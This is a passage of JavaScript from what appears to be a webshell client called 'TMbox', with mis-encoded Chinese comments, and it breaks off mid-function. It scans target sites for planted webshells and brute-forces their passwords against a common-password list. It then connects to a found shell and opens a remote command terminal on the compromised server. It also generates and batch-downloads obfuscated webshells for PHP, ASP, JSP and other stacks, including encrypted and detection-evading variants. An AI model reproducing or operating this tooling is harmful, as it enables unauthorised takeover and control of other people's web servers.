            scanState.foundShells.push({ url, type, description });

            const foundEl = document.getElementById('foundShells');
            if (foundEl.querySelector('.text-center')) {
                foundEl.innerHTML = '';
            }

            const entry = document.createElement('div');
            entry.className = 'bg-slate-900 rounded p-2 border border-green-500/50';
            entry.innerHTML = `
                <div class="flex justify-between items-center">
                    <span class="text-green-400 text-xs truncate flex-1" title="${url}">${url}</span>
                    <span class="text-[10px] text-slate-500 ml-2">${type}</span>
                </div>
                <div class="text-[10px] text-slate-500 mt-1">${description}</div>
                <div class="flex gap-2 mt-2">
                    <button onclick="tryConnectShell('${url}')" class="text-[10px] bg-pink-600 hover:bg-pink-700 text-white px-2 py-0.5 rounded">è¿æ¥</button>
                    <button onclick="testShellUrl('${url}')" class="text-[10px] bg-blue-600 hover:bg-blue-700 text-white px-2 py-0.5 rounded">æµ‹è¯•</button>
                    <button onclick="copyToClipboard('${url}')" class="text-[10px] bg-slate-600 hover:bg-slate-700 text-white px-2 py-0.5 rounded">å¤åˆ¶</button>
                </div>
            `;
            foundEl.appendChild(entry);

            document.getElementById('foundShellCount').textContent = scanState.foundShells.length;
            document.getElementById('quickConnectPanel').classList.remove('hidden');
            document.getElementById('quickConnectUrl').value = url;

            addScanLog(`[+] å‘ç°: ${url}`, 'success');
        }

        // å°è¯•è¿æ¥å‘ç°çš„ shell
        async function tryConnectShell(url) {
            document.getElementById('quickConnectUrl').value = url;
            document.getElementById('quickConnectPanel').classList.remove('hidden');

            // å°è¯•å¸¸è§å¯†ç 
            for (const pwd of COMMON_PASSWORDS) {
                if (!scanState.running) break;
                addScanLog(`[*] å°è¯•å¯†ç : ${pwd}`, 'info');

                try {
                    const shell = await WebshellCore.addShell({
                        name: 'Discovered: ' + url.split('/').pop(),
                        url: url,
                        password: pwd,
                        type: 'php_eval'
                    });

                    const result = await WebshellCore.testShell(shell);
                    if (result.success) {
                        addScanLog(`[+] è¿æ¥æˆåŠŸ! å¯†ç : ${pwd}`, 'success');
                        await WebshellCore.setActiveShell(shell.id);
                        refreshShellList();
                        selectShell(shell.id);
                        switchTab('terminal');
                        return;
                    }

                    WebshellCore.deleteShell(shell.id);
                } catch (e) {
                    // ç»§ç»­å°è¯•ä¸‹ä¸€ä¸ªå¯†ç 
                }
            }

            addScanLog('[!] è‡ªåŠ¨ç ´è§£å¤±è´¥ï¼Œè¯·æ‰‹åŠ¨è¾“å…¥å¯†ç ', 'warning');
        }

        // æµ‹è¯• shell URL
        async function testShellUrl(url) {
            try {
                addScanLog(`[*] æµ‹è¯•: ${url}`, 'info');
                const response = await fetch(url);
                const text = await response.text();
                addScanLog(`[*] çŠ¶æ€ç : ${response.status}, å“åº”é•¿åº¦: ${text.length}`, 'info');

                if (isWebshellResponse(text, url)) {
                    addScanLog('[+] æ£€æµ‹åˆ° webshell ç‰¹å¾!', 'success');
                } else {
                    addScanLog('[-] æœªæ£€æµ‹åˆ°æ˜æ˜¾ç‰¹å¾', 'warning');
                }
            } catch (e) {
                addScanLog(`[!] æµ‹è¯•å¤±è´¥: ${e.message}`, 'error');
            }
        }

        // å¤åˆ¶åˆ°å‰ªè´´æ¿
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text);
            addScanLog('[*] å·²å¤åˆ¶åˆ°å‰ªè´´æ¿', 'info');
        }

        // å¿«é€Ÿè¿æ¥
        async function quickConnect() {
            const url = document.getElementById('quickConnectUrl').value;
            const password = document.getElementById('quickConnectPassword').value;
            const type = document.getElementById('quickConnectType').value;

            if (!url || !password) {
                alert('è¯·è¾“å…¥ URL å’Œå¯†ç ');
                return;
            }

            addScanLog(`[*] æ­£åœ¨è¿æ¥: ${url}`, 'info');

            const shell = await WebshellCore.addShell({
                name: 'Quick: ' + url.split('/').pop(),
                url: url,
                password: password,
                type: type === 'auto' ? 'php_eval' : type
            });

            const result = await WebshellCore.testShell(shell);
            if (result.success) {
                addScanLog('[+] è¿æ¥æˆåŠŸ!', 'success');
                await WebshellCore.setActiveShell(shell.id);
                refreshShellList();
                selectShell(shell.id);
                switchTab('terminal');
            } else {
                addScanLog(`[-] è¿æ¥å¤±è´¥: ${result.message}`, 'error');
                WebshellCore.deleteShell(shell.id);
            }
        }

        // æ‰«æå¸¸è§ webshell (å¿«æ·æŒ‰é’®)
        async function scanCommonWebshells() {
            const target = document.getElementById('scanTargetUrl').value;
            if (!target) {
                alert('è¯·å…ˆè¾“å…¥ç›®æ ‡ç½‘å€');
                return;
            }
            if (!target.startsWith('http')) {
                document.getElementById('scanTargetUrl').value = 'http://' + target;
            }
            await startAutoScan();
        }

        // è°ƒç”¨ Nuclei (å¿«æ·æŒ‰é’®)
        async function scanWithNuclei() {
            const target = document.getElementById('scanTargetUrl').value;
            if (!target) {
                alert('è¯·å…ˆè¾“å…¥ç›®æ ‡ç½‘å€');
                return;
            }
            document.getElementById('scanNuclei').checked = true;
            document.getElementById('scanCommonPaths').checked = false;
            document.getElementById('scanBackup').checked = false;
            document.getElementById('scanFuzz').checked = false;
            await startAutoScan();
        }

        // ç›®å½•çˆ†ç ´ (å¿«æ·æŒ‰é’®)
        async function fuzzDirectories() {
            const target = document.getElementById('scanTargetUrl').value;
            if (!target) {
                alert('è¯·å…ˆè¾“å…¥ç›®æ ‡ç½‘å€');
                return;
            }
            document.getElementById('scanNuclei').checked = false;
            document.getElementById('scanCommonPaths').checked = false;
            document.getElementById('scanBackup').checked = false;
            document.getElementById('scanFuzz').checked = true;
            await startAutoScan();
        }

        // æµ‹è¯•è¿æ¥ (å¿«æ·æŒ‰é’®)
        async function testConnection() {
            const url = document.getElementById('quickConnectUrl').value;
            if (url) {
                await testShellUrl(url);
            } else {
                alert('è¯·å…ˆæ‰«æå‘ç°æˆ–è¾“å…¥ URL');
            }
        }

        // Shell åˆ—è¡¨åˆ·æ–°
        function refreshShellList() {
            const shells = WebshellCore.getShells();
            const listEl = document.getElementById('shellList');
            const countEl = document.getElementById('shellCount');
            countEl.textContent = `${shells.length} ä¸ª`;

            if (shells.length === 0) {
                listEl.innerHTML = '<div class="text-center text-slate-600 text-xs py-4">æš‚æ—  Shell</div>';
                return;
            }

            listEl.innerHTML = shells.map(shell => {
                const isActive = WebshellCore.getActiveShell()?.id === shell.id;
                const statusColor = shell.status === 'active' ? 'bg-green-500' :
                                   shell.status === 'error' ? 'bg-red-500' :
                                   shell.status === 'connecting' ? 'bg-yellow-500 animate-pulse' : 'bg-yellow-500';
                const cryptoBadge = shell.enableEncryption ? '<span class="crypto-badge bg-green-900/50 text-green-400 ml-1">ğŸ”</span>' : '';
                return `
                    <div class="shell-card p-2 bg-slate-900 rounded border border-slate-700 cursor-pointer transition ${isActive ? 'border-pink-500' : ''}"
                         onclick="selectShell('${shell.id}')">
                        <div class="flex items-center gap-2">
                            <div class="w-2 h-2 rounded-full ${statusColor}"></div>
                            <div class="flex-1 truncate text-xs font-medium">${shell.name}</div>
                            ${cryptoBadge}
                            <button onclick="event.stopPropagation(); deleteShell('${shell.id}')" class="text-slate-500 hover:text-red-400 text-xs">&times;</button>
                        </div>
                        <div class="text-[10px] text-slate-500 truncate mt-1">${shell.url}</div>
                        <div class="text-[10px] text-slate-600 mt-0.5">${shell.type}</div>
                    </div>
                `;
            }).join('');
        }

        // é€‰æ‹© Shell
        async function selectShell(id) {
            const shell = await WebshellCore.setActiveShell(id);
            if (shell) {
                document.getElementById('shellStatus').textContent = shell.name;
                document.getElementById('shellStatus').className = 'text-[10px] px-2 py-0.5 rounded bg-green-900/50 text-green-400';
                updateCryptoStatus(shell.enableEncryption, shell);
                refreshShellList();

                // æµ‹è¯•è¿æ¥å¹¶è·å–ä¿¡æ¯
                appendTerminalOutput(`[+] æ­£åœ¨è¿æ¥ ${shell.url}...`, 'info');
                if (shell.enableEncryption) {
                    appendTerminalOutput(`[*] åŠ å¯†æ¨¡å¼: AES-256-CBC + RSA-2048`, 'info');
                    appendTerminalOutput(`[*] Session ID: ${shell.crypto?.sessionId?.substring(0, 16)}...`, 'info');
                }

                const result = await WebshellCore.testShell(shell);
                if (result.success) {
                    appendTerminalOutput(`[+] è¿æ¥æˆåŠŸ!`, 'success');
                    if (shell.info) {
                        appendTerminalOutput(`[*] ç³»ç»Ÿ: ${shell.info.kernel || 'Unknown'}`, 'info');
                        appendTerminalOutput(`[*] ç”¨æˆ·: ${shell.info.user || 'Unknown'}`, 'info');
                        appendTerminalOutput(`[*] è·¯å¾„: ${shell.info.cwd || 'Unknown'}`, 'info');
                        WebshellTerminal.setConfig({
                            cwd: shell.info.cwd || '/',
                            username: shell.info.user || 'www-data',
                            hostname: shell.info.hostname || 'target'
                        });
                        updatePrompt();
                    }
                    // æ›´æ–°åºåˆ—å·æ˜¾ç¤º
                    document.getElementById('sequenceNum').textContent = shell.crypto?.sequence || 0;
                } else {
                    appendTerminalOutput(`[-] è¿æ¥å¤±è´¥: ${result.message}`, 'error');
                }
            }
        }

        // åˆ é™¤ Shell
        function deleteShell(id) {
            if (confirm('ç¡®å®šåˆ é™¤è¿™ä¸ª Shell?')) {
                WebshellCore.deleteShell(id);
                refreshShellList();
                if (WebshellCore.getActiveShell()?.id === id) {
                    document.getElementById('shellStatus').textContent = 'æœªè¿æ¥';
                    document.getElementById('shellStatus').className = 'text-[10px] px-2 py-0.5 rounded bg-slate-800 text-slate-500';
                    updateCryptoStatus(false);
                }
            }
        }

        // æ˜¾ç¤º/éšè—æ¨¡æ€æ¡†
        function showAddShellModal() { document.getElementById('addShellModal').classList.remove('hidden'); }
        function hideAddShellModal() { document.getElementById('addShellModal').classList.add('hidden'); }
        function showGenerateShellModal() { document.getElementById('generateShellModal').classList.remove('hidden'); updateGeneratedShell(); }
        function hideGenerateShellModal() { document.getElementById('generateShellModal').classList.add('hidden'); }
        function showImportModal() { document.getElementById('importModal').classList.remove('hidden'); }
        function hideImportModal() { document.getElementById('importModal').classList.add('hidden'); }

        // æ·»åŠ æ–° Shell
        async function addNewShell() {
            const name = document.getElementById('shellName').value || 'New Shell';
            const url = document.getElementById('shellUrl').value;
            const password = document.getElementById('shellPassword').value || 'cmd';
            const type = document.getElementById('shellType').value;
            const enableEncryption = document.getElementById('shellEncryption').checked;
            const enableSign = document.getElementById('shellSign').checked;
            const enablePadding = document.getElementById('shellPadding').checked;

            if (!url) {
                alert('è¯·è¾“å…¥ URL');
                return;
            }

            const shell = await WebshellCore.addShell({
                name, url, password, type,
                enableEncryption,
                enableSign,
                enablePadding
            });
            hideAddShellModal();
            refreshShellList();
            selectShell(shell.id);
        }

        // æ›´æ–°ç”Ÿæˆçš„ Shell ä»£ç 
        function updateGeneratedShell() {
            const type = document.getElementById('genShellType').value;
            const password = document.getElementById('genShellPassword').value || 'cmd';
            const obfuscateLevel = document.getElementById('genObfuscateLevel').value;

            let code;
            if (obfuscateLevel === 'none') {
                code = WebshellProtocol.generateShell(type, password);
            } else {
                code = WebshellProtocol.generateShell(type, password, { obfuscate: true, obfuscateMethod: obfuscateLevel });
            }

            // å¦‚æœç”Ÿæˆå™¨ä¸å­˜åœ¨ï¼Œå›é€€åˆ°åŸºç¡€ç”Ÿæˆ
            if (!code) {
                code = WebshellProtocol.generateShellCode(type, password);
            }

            document.getElementById('generatedShellCode').value = code;

            // æ›´æ–°ä»£ç å¤§å°å’Œè¡Œæ•°
            const bytes = new Blob([code]).size;
            const lines = code.split('\n').length;
            document.getElementById('codeSize').textContent = bytes + ' bytes';
            document.getElementById('codeLines').textContent = lines + ' è¡Œ';

            // æ›´æ–°è¯´æ˜
            updateShellDescription(type);
        }

        // æ›´æ–° Shell ç±»å‹è¯´æ˜
        function updateShellDescription(type) {
            const descriptions = {
                // PHP 8.x ä¸“ç”¨
                'php8_eval': 'ğŸŸ¢ PHP 8.x æ¨è - ç›´æ¥ä½¿ç”¨ eval()ï¼Œæœ€å¯é çš„æ–¹å¼ã€‚PHP 8.0+ å®Œç¾å…¼å®¹ã€‚',
                'php8_system': 'ğŸŸ¢ PHP 8.x - ä½¿ç”¨ system() æ‰§è¡Œå‘½ä»¤å¹¶ç›´æ¥è¾“å‡ºç»“æœã€‚',
                'php8_passthru': 'ğŸŸ¢ PHP 8.x - ä½¿ç”¨ passthru() æ‰§è¡Œå‘½ä»¤ï¼Œé€‚åˆäºŒè¿›åˆ¶è¾“å‡ºã€‚',
                'php8_shell_exec': 'ğŸŸ¢ PHP 8.x - ä½¿ç”¨ shell_exec() æ‰§è¡Œå‘½ä»¤ï¼Œè¿”å›å®Œæ•´è¾“å‡ºã€‚',
                'php8_proc_open': 'ğŸŸ¢ PHP 8.x - ä½¿ç”¨ proc_open() æœ€å¼ºå¤§çš„æ–¹å¼ï¼Œæ”¯æŒåŒå‘ç®¡é“é€šä¿¡ã€‚',
                'php8_popen': 'ğŸŸ¢ PHP 8.x - ä½¿ç”¨ popen() æ‰“å¼€è¿›ç¨‹ç®¡é“ã€‚',
                'php8_exec': 'ğŸŸ¢ PHP 8.x - ä½¿ç”¨ exec() æ‰§è¡Œå‘½ä»¤ï¼Œè¾“å‡ºåˆ°æ•°ç»„ã€‚',
                'php8_dynamic': 'ğŸŸ¢ PHP 8.x - åŠ¨æ€å‡½æ•°è°ƒç”¨ï¼Œé€šè¿‡ GET å‚æ•°é€‰æ‹©æ‰§è¡Œå‡½æ•°ã€‚',
                'php8_backtick': 'ğŸŸ¢ PHP 8.x - ä½¿ç”¨åå¼•å·æ‰§è¡Œå‘½ä»¤ï¼ˆéœ€è¦ shell_exec æœªè¢«ç¦ç”¨ï¼‰ã€‚',
                'php8_pcntl': 'ğŸŸ¢ PHP 8.x - ä½¿ç”¨ pcntl_exec() æ‰§è¡Œå‘½ä»¤ï¼ˆéœ€è¦ pcntl æ‰©å±•ï¼‰ã€‚',
                // PHP 7.x ä¸“ç”¨
                'php7_create_function': 'ğŸŸ¡ PHP 7.x - ä½¿ç”¨ create_function() åˆ›å»ºåŒ¿åå‡½æ•°ï¼ˆPHP 7.2+ å·²å¼ƒç”¨ï¼‰ã€‚',
                'php7_assert': 'ğŸŸ¡ PHP 7.x - ä½¿ç”¨ assert() æ‰§è¡Œä»£ç ï¼ˆPHP 7.2+ ä¼šäº§ç”Ÿå¼ƒç”¨è­¦å‘Šï¼‰ã€‚',
                'php7_preg_replace': 'ğŸŸ¡ PHP 5.x-7.0 - ä½¿ç”¨ preg_replace /e ä¿®é¥°ç¬¦ï¼ˆPHP 7+ å·²ç§»é™¤ï¼‰ã€‚',
                // PHP é€šç”¨
                'php_base64': 'ğŸ”µ PHP é€šç”¨ - Base64 ç¼–ç å‘½ä»¤ï¼Œéœ€è¦å®¢æˆ·ç«¯é…åˆç¼–ç ã€‚',
                'php_rot13': 'ğŸ”µ PHP é€šç”¨ - ROT13 ç¼–ç å‘½ä»¤ï¼Œéœ€è¦å®¢æˆ·ç«¯é…åˆç¼–ç ã€‚',
                'php_xor': 'ğŸ”µ PHP é€šç”¨ - XOR åŠ å¯†å‘½ä»¤ï¼Œä½¿ç”¨å¯†ç ä½œä¸ºå¯†é’¥ã€‚',
                'php_concat': 'ğŸ”µ PHP é€šç”¨ - å­—ç¬¦ä¸²æ‹¼æ¥æŠ€æœ¯ï¼Œå°†å‡½æ•°åæ‹†åˆ†æ‹¼æ¥ã€‚',
                'php_variable_func': 'ğŸ”µ PHP é€šç”¨ - åˆ©ç”¨ PHP å¯å˜å‡½æ•°ç‰¹æ€§ã€‚',
                'php_callback_array': 'ğŸ”µ PHP é€šç”¨ - array_map å›è°ƒå‡½æ•°æ‰§è¡Œã€‚',
                'php_callback_filter': 'ğŸ”µ PHP é€šç”¨ - array_filter å›è°ƒæ‰§è¡Œã€‚',
                'php_callback_walk': 'ğŸ”µ PHP é€šç”¨ - array_walk å›è°ƒæ‰§è¡Œã€‚',
                'php_callback_usort': 'ğŸ”µ PHP é€šç”¨ - usort å›è°ƒæ‰§è¡Œã€‚',
                'php_callback_reduce': 'ğŸ”µ PHP é€šç”¨ - array_reduce å›è°ƒæ‰§è¡Œã€‚',
                'php_reflection': 'ğŸ”µ PHP é€šç”¨ - åˆ©ç”¨ PHP åå°„ APIã€‚',
                'php_class_construct': 'ğŸ”µ PHP é€šç”¨ - __construct é­”æœ¯æ–¹æ³•ã€‚',
                'php_class_invoke': 'ğŸ”µ PHP é€šç”¨ - __invoke é­”æœ¯æ–¹æ³•ã€‚',
                'php_class_call': 'ğŸ”µ PHP é€šç”¨ - __call é­”æœ¯æ–¹æ³•ã€‚',
                'php_class_get': 'ğŸ”µ PHP é€šç”¨ - __get é­”æœ¯æ–¹æ³•ã€‚',
                'php_strrev': 'ğŸ”µ PHP é€šç”¨ - å­—ç¬¦ä¸²åè½¬å‡½æ•°åã€‚',
                'php_multilayer_b64': 'ğŸ”µ PHP é€šç”¨ - å¤šå±‚ Base64 ç¼–ç ã€‚',
                'php_gzip': 'ğŸ”µ PHP é€šç”¨ - Gzip å‹ç¼©ç¼–ç ã€‚',
                'php_comment_split': 'ğŸ”µ PHP é€šç”¨ - åˆ©ç”¨æ³¨é‡Šåˆ†å‰²å­—ç¬¦ä¸²ã€‚',
                'php_unicode': 'ğŸ”µ PHP é€šç”¨ - Unicode è½¬ä¹‰ç¼–ç ã€‚',
                'php_hex': 'ğŸ”µ PHP é€šç”¨ - åå…­è¿›åˆ¶ç¼–ç å‡½æ•°åã€‚',
                'php_chr_shift': 'ğŸ”µ PHP é€šç”¨ - chr() æ‹¼æ¥å­—ç¬¦ã€‚',
                'php_preg_callback': 'ğŸ”µ PHP é€šç”¨ - preg_replace_callback æ­£åˆ™å›è°ƒã€‚',
                'php_variable_overwrite': 'ğŸ”µ PHP é€šç”¨ - parse_str å˜é‡è¦†ç›–ã€‚',
                'php_no_alpha_num': 'ğŸ”µ PHP é€šç”¨ - æ— å­—æ¯æ•°å­— Webshellã€‚',
                'php_cookie': 'ğŸ”µ PHP é€šç”¨ - Cookie ä¼ å‚ã€‚',
                'php_header': 'ğŸ”µ PHP é€šç”¨ - HTTP Header ä¼ å‚ã€‚',
                'php_request': 'ğŸ”µ PHP é€šç”¨ - $_REQUEST æ··åˆä¼ å‚ã€‚',
                'php_include': 'ğŸ”µ PHP é€šç”¨ - æ–‡ä»¶åŒ…å«å‹ã€‚',
                'php_dynamic_func': 'ğŸ”µ PHP é€šç”¨ - éšæœºé€‰æ‹©æ‰§è¡Œå‡½æ•°ã€‚',
                'php_image_header': 'ğŸ”µ PHP é€šç”¨ - å›¾ç‰‡é©¬ï¼ˆGIF89a å¤´ï¼‰ã€‚',
                'php_session': 'ğŸ”µ PHP é€šç”¨ - Session å­˜å‚¨å‹ã€‚',
                'php_log_include': 'ğŸ”µ PHP é€šç”¨ - æ—¥å¿—åŒ…å«å‹ã€‚',
                'php_htaccess': 'ğŸ”µ ç‰¹æ®Š - .htaccess é…ç½®æ–‡ä»¶ã€‚',
                // ASP
                'asp_simple': 'ASP åŸºç¡€ä¸€å¥è¯ï¼Œä½¿ç”¨ Execute æ‰§è¡Œã€‚',
                'asp_encode': 'ASP ç¼–ç æ‰§è¡Œï¼Œä½¿ç”¨ ExecuteGlobalã€‚',
                'asp_chr': 'ASP Chr ç¼–ç ï¼ŒASCII ç æ‹¼æ¥ã€‚',
                'asp_include': 'SSI æœåŠ¡å™¨ç«¯åŒ…å«ã€‚',
                // ASPX
                'aspx_jscript': 'ASPX JScript ä¸€å¥è¯ã€‚',
                'aspx_csharp': 'ASPX C# å‘½ä»¤æ‰§è¡Œã€‚',
                'aspx_base64': 'ASPX Base64 ç¼–ç ã€‚',
                'aspx_reflection': 'ASPX åå°„åŠ è½½ã€‚',
                // JSP
                'jsp_runtime': 'JSP Runtime æ‰§è¡Œã€‚',
                'jsp_processbuilder': 'JSP ProcessBuilderã€‚',
                'jsp_scriptengine': 'JSP è„šæœ¬å¼•æ“ã€‚',
                'jsp_expression': 'JSP EL è¡¨è¾¾å¼ã€‚',
                'jsp_bsh': 'JSP BeanShellã€‚',
                // å†°è
                'behinder_php_enhanced': 'å†°è PHP å¢å¼ºç‰ˆï¼Œä½¿ç”¨ OpenSSL AES åŠ å¯†é€šä¿¡ã€‚',
                'behinder_jsp_enhanced': 'å†°è JSP å¢å¼ºç‰ˆï¼Œæ”¯æŒåŠ¨æ€åŠ è½½å­—èŠ‚ç ã€‚',
                // å…¶ä»–
                'py_flask': 'Python Flask Web æ¡†æ¶å®ç°çš„ Webshellã€‚',
                'py_django': 'Python Django æ¡†æ¶ View å®ç°ã€‚',
                'nodejs_express': 'Node.js Express æ¡†æ¶å®ç°ã€‚',
                'go_http': 'Go è¯­è¨€ HTTP æœåŠ¡å®ç°ã€‚'
            };

            const descEl = document.getElementById('shellDescription');
            descEl.innerHTML = '<span class="text-cyan-400">ğŸ’¡ è¯´æ˜:</span> ' + (descriptions[type] || 'é€‰æ‹©ç±»å‹æŸ¥çœ‹è¯¦ç»†è¯´æ˜');
        }

        // è¿‡æ»¤ Shell åˆ†ç±»
        function filterShellCategory(category) {
            // æ›´æ–°æŒ‰é’®çŠ¶æ€
            document.querySelectorAll('.shell-cat-btn').forEach(btn => {
                if (btn.dataset.cat === category) {
                    btn.classList.remove('bg-slate-700', 'text-slate-300');
                    btn.classList.add('bg-purple-600', 'text-white');
                } else {
                    btn.classList.remove('bg-purple-600', 'text-white');
                    btn.classList.add('bg-slate-700', 'text-slate-300');
                }
            });

            // è¿‡æ»¤é€‰é¡¹
            const select = document.getElementById('genShellType');
            const optgroups = select.querySelectorAll('optgroup');

            optgroups.forEach(optgroup => {
                if (category === 'all') {
                    optgroup.style.display = '';
                } else {
                    const label = optgroup.label;
                    let show = false;

                    if (category === 'PHP 8.x' && label.includes('PHP 8.x')) show = true;
                    else if (category === 'PHP 7.x' && label.includes('PHP 7.x')) show = true;
                    else if (category === 'PHP é€šç”¨' && (label.includes('é€šç”¨') || label.includes('å›è°ƒ') || label.includes('ç±»ä¸') || label.includes('ä¼ å‚') || label.includes('ç‰¹æ®Š'))) show = true;
                    else if (category === 'ASP' && label.includes('ASP')) show = true;
                    else if (category === 'ASPX' && label.includes('ASPX')) show = true;
                    else if (category === 'JSP' && label.includes('JSP')) show = true;
                    else if (category === 'å†°è' && label.includes('å†°è')) show = true;
                    else if (category === 'å…¶ä»–' && (label.includes('Python') || label.includes('Node') || label.includes('Go'))) show = true;

                    optgroup.style.display = show ? '' : 'none';
                }
            });
        }

        // å¿«é€Ÿé€‰æ‹©æ¨èç±»å‹
        function quickSelectShell(phpVersion) {
            const select = document.getElementById('genShellType');
            const password = document.getElementById('genShellPassword');

            switch(phpVersion) {
                case 'php8':
                    select.value = 'php8_eval';
                    if (!password.value) password.value = 'cmd';
                    break;
                case 'php7':
                    select.value = 'php7_assert';
                    if (!password.value) password.value = 'cmd';
                    break;
                case 'php5':
                    select.value = 'php_base64';
                    if (!password.value) password.value = 'cmd';
                    break;
                case 'behinder':
                    select.value = 'behinder_php_enhanced';
                    if (!password.value) password.value = 'pass';
                    break;
                case 'bypass':
                    select.value = 'php_no_alpha_num';
                    if (!password.value) password.value = 'cmd';
                    break;
            }
            updateGeneratedShell();
        }

        // åˆ‡æ¢ä½¿ç”¨æŒ‡å—æ˜¾ç¤º
        function toggleUsageGuide() {
            const guide = document.getElementById('usageGuide');
            guide.classList.toggle('hidden');
        }

        // ä¸€é”®ç”Ÿæˆå¹¶æ·»åŠ åˆ°åˆ—è¡¨ (è¾“å…¥URLåå¿«é€Ÿä½¿ç”¨)
        async function generateAndAdd() {
            const type = document.getElementById('genShellType').value;
            const password = document.getElementById('genShellPassword').value || 'cmd';

            // å¼¹å‡ºè¾“å…¥URLå¯¹è¯æ¡†
            const url = prompt('è¯·è¾“å…¥ Webshell çš„å®Œæ•´ URL:\nä¾‹å¦‚: http://target.com/uploads/shell.php');
            if (!url) return;

            // æ·»åŠ åˆ°åˆ—è¡¨
            const shell = await WebshellCore.addShell({
                name: url.split('/').pop() || 'New Shell',
                url: url,
                password: password,
                type: type,
                enableEncryption: true
            });

            hideGenerateShellModal();
            refreshShellList();
            selectShell(shell.id);
        }

        // éšæœºç”Ÿæˆ
        function generateRandomShell() {
            const select = document.getElementById('genShellType');
            const options = select.querySelectorAll('option');
            const randomIndex = Math.floor(Math.random() * options.length);
            select.selectedIndex = randomIndex;

            // éšæœºå¯†ç 
            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let password = '';
            for (let i = 0; i < 6; i++) {
                password += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            document.getElementById('genShellPassword').value = password;

            // éšæœºæ··æ·†çº§åˆ«
            const levels = ['none', 'basic', 'variable', 'comment'];
            document.getElementById('genObfuscateLevel').value = levels[Math.floor(Math.random() * levels.length)];

            updateGeneratedShell();
        }

        // æ˜¾ç¤ºæ‰¹é‡ä¸‹è½½æ¨¡æ€æ¡†
        function downloadAsZip() {
            const modal = document.getElementById('batchDownloadModal');
            const list = document.getElementById('batchShellList');

            const types = WebshellProtocol.getShellTypes();
            list.innerHTML = types.map(t => `
                <label class="flex items-center gap-2 p-1.5 hover:bg-slate-700 rounded cursor-pointer">
                    <input type="checkbox" class="shell-checkbox rounded" value="${t.id}" onchange="updateSelectedCount()">
                    <span class="text-[10px] text-slate-400 w-16">${t.category}</span>
                    <span class="text-xs text-slate-200">${t.name}</span>
                </label>
            `).join('');

            modal.classList.remove('hidden');
            updateSelectedCount();
        }

        function hideBatchDownloadModal() {
            document.getElementById('batchDownloadModal').classList.add('hidden');
        }

        function selectAllShells() {
            document.querySelectorAll('.shell-checkbox').forEach(cb => cb.checked = true);
            updateSelectedCount();
        }

        function deselectAllShells() {
            document.querySelectorAll('.shell-checkbox').forEach(cb => cb.checked = false);
            updateSelectedCount();
        }

        function updateSelectedCount() {
            const count = document.querySelectorAll('.shell-checkbox:checked').length;
            document.getElementById('selectedCount').textContent = count;
        }

        // æ‰§è¡Œæ‰¹é‡ä¸‹è½½
        async function executeBatchDownload() {
            const checkboxes = document.querySelectorAll('.shell-checkbox:checked');
            if (checkboxes.length === 0) {
                alert('è¯·è‡³å°‘é€‰æ‹©ä¸€ä¸ªç±»å‹');
                return;
            }

            const password = document.getElementById('genShellPassword').value || 'cmd';
            const obfuscateLevel = document.getElementById('genObfuscateLevel').value;

            // ä½¿ç”¨ JSZip åˆ›å»ºå‹ç¼©åŒ…
            let zipContent = '';
            const files = [];

            checkboxes.forEach(cb => {
                const type = cb.value;
                let code;
                if (obfuscateLevel === 'none') {
                    code = WebshellProtocol.generateShell(type, password);
                } else {
                    code = WebshellProtocol.generateShell(type, password, { obfuscate: true, obfuscateMethod: obfuscateLevel });
                }
                if (!code) {
                    code = WebshellProtocol.generateShellCode(type, password);
                }

                const ext = WebshellProtocol.getShellExtension(type);
                const name = type.replace(/_/g, '-') + '.' + ext;
                files.push({ name, code });
            });

            // ç®€å•æ‰“åŒ…ä¸ºå¤šä¸ªæ–‡ä»¶ä¸‹è½½ï¼ˆæ—  JSZip åº“æ—¶ï¼‰
            if (files.length <= 5) {
                // å°‘é‡æ–‡ä»¶ç›´æ¥é€ä¸ªä¸‹è½½
                files.forEach((f, i) => {
                    setTimeout(() => {
                        downloadFile(f.name, f.code);
                    }, i * 300);
                });
            } else {
                // å¤šæ–‡ä»¶ç”Ÿæˆä¸€ä¸ªæ±‡æ€»æ–‡æœ¬
                let combined = '# TMbox Webshell Collection\n';
                combined += '# Generated: ' + new Date().toISOString() + '\n';
                combined += '# Password: ' + password + '\n\n';
                combined += '='.repeat(60) + '\n\n';

                files.forEach(f => {
                    combined += `## File: ${f.name}\n`;
                    combined += '-'.repeat(40) + '\n';
                    combined += f.code;
                    combined += '\n' + '='.repeat(60) + '\n\n';
                });

                downloadFile('webshells-collection.txt', combined);
            }

            hideBatchDownloadModal();
            alert(`å·²ä¸‹è½½ ${files.length} ä¸ªæ–‡ä»¶`);
        }

        // ä¸‹è½½å•ä¸ªæ–‡ä»¶
        function downloadFile(filename, content) {
            const blob = new Blob([content], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        }

        // å¤åˆ¶ç”Ÿæˆçš„ Shell
        function copyGeneratedShell() {
            const code = document.getElementById('generatedShellCode').value;
            navigator.clipboard.writeText(code);
            alert('å·²å¤åˆ¶åˆ°å‰ªè´´æ¿');
        }

        // ä¸‹è½½ç”Ÿæˆçš„ Shell
        function downloadGeneratedShell() {
            const code = document.getElementById('generatedShellCode').value;
            const type = document.getElementById('genShellType').value;
            const ext = type.includes('jsp') ? 'jsp' : type.includes('aspx') ? 'aspx' : 'php';
            const blob = new Blob([code], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `shell.${ext}`;
            a.click();
            URL.revokeObjectURL(url);
        }

        // ç»ˆç«¯ç›¸å…³
        function appendTerminalOutput(text, type = 'normal') {
            const output = document.getElementById('terminalOutput');
            const colors = {
                'normal': 'text-green-400',
                'info': 'text-cyan-400',
                'success': 'text-green-400',
                'error': 'text-red-400',
                'warning': 'text-yellow-400'
            };
            const span = document.createElement('span');
            span.className = colors[type] || colors['normal'];
            span.textContent = text + '\n';
            output.appendChild(span);
            output.scrollTop = output.scrollHeight;
        }

        function updatePrompt() {
            const config = WebshellTerminal.getConfig();
            const prompt = `${config.username}@${config.hostname}:${config.cwd}${config.username === 'root' ? '#' : '$'} `;
            document.getElementById('terminalPrompt').textContent = prompt;
        }

        async function executeTerminalCommand() {
            const input = document.getElementById('terminalInput');
            const cmd = input.value.trim();
            if (!cmd) return;

            const shell = WebshellCore.getActiveShell();
            if (!shell) {
